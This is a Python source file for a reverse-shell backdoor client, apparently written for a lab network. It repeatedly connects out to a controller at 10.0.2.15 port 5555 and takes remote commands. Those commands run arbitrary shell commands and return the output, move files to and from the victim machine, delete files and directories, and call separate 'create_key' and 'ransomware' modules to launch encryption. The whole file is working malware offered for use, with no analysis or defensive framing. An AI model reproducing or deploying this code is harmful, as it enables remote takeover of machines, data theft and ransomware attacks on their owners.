import socket
import time
import subprocess
import json
import os

def reliable_send(data):
        jsondata = json.dumps(data)
        s.send(jsondata.encode())

def reliable_recv():
        data = ''
        while True:
                try:
                        data = data + s.recv(1024).decode().rstrip()
                        return json.loads(data)
                except ValueError:
                        continue

def connection():
	while True:
		time.sleep(20)
		try:
			s.connect(('10.0.2.15',5555))
			shell()
			s.close()
			break
		except:
			connection()

def upload_file(file_name):
	f = open(file_name, 'rb')
	s.send(f.read())

def download_file(file_name):
        f = open(file_name, 'wb')
        s.settimeout(1)
        chunk = s.recv(1024)
        while chunk:
                f.write(chunk)
                try:
                        chunk = s.recv(1024)
                except socket.timeout as e:
                        break
        s.settimeout(None)
        f.close()

def check_permissions(file):
    # for file in args:
	permissions = ''
	if os.access(file, os.R_OK) == True:
		permissions+= 'r'
	if os.access(file, os.W_OK) == True:
		permissions+= 'w'
	if os.access(file, os.X_OK) == True:
		permissions+= 'x'
	print(f'{file} : {permissions}')

def rm(file):
	if os.path.exists(file):
		print(f'removing {file}')
		os.remove(file)
	else:
		print(f"The file {file} cannot be removed because it does not exist")

def shell():
	while True:
		command = reliable_recv()
		if command == 'quit':
			break
		elif command == 'clear':
			pass
		elif command[:3] == 'cd ':
			os.chdir(command[3:])
		elif command[:8] == 'download':
			upload_file(command[9:])
		elif command[:6] == 'upload':
			download_file(command[7:])
		elif command[:2] == 'll':
			check_permissions(command[3:])
			# file_list = command[3:].split(' ') # split on a space to get list of files seperated by comma
			# check_permissions(*file_list) # need to unpack list 
		elif command[:2] == 'rm':
			rm(command[3:])
			# file_list = command[3:].split(' ') # split on a space to get list of files seperated by comma
			# rm(*file_list) 
		elif command[:5] == 'rmdir':
			os.rmdir(command[6:])
		elif command[:5] == 'mkdir':
			os.mkdir(command[6:])
		elif command[:10] == 'create_key' or command[:10] == 'create key':
			from generate import create_key
			create_key()
		elif command[:10] == 'ransomware':
			from ransomware import ransom
			ransom()
		else:
			p1 = subprocess.run(command, shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			result = f'stdout: {p1.stdout}\nstderr: {p1.stderr}'
			reliable_send(result)
		# else:
		# 	execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		# 	result = execute.stdout.read() + execute.stderr.read()
		# 	result = result.decode()
		# 	reliable_send(result)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
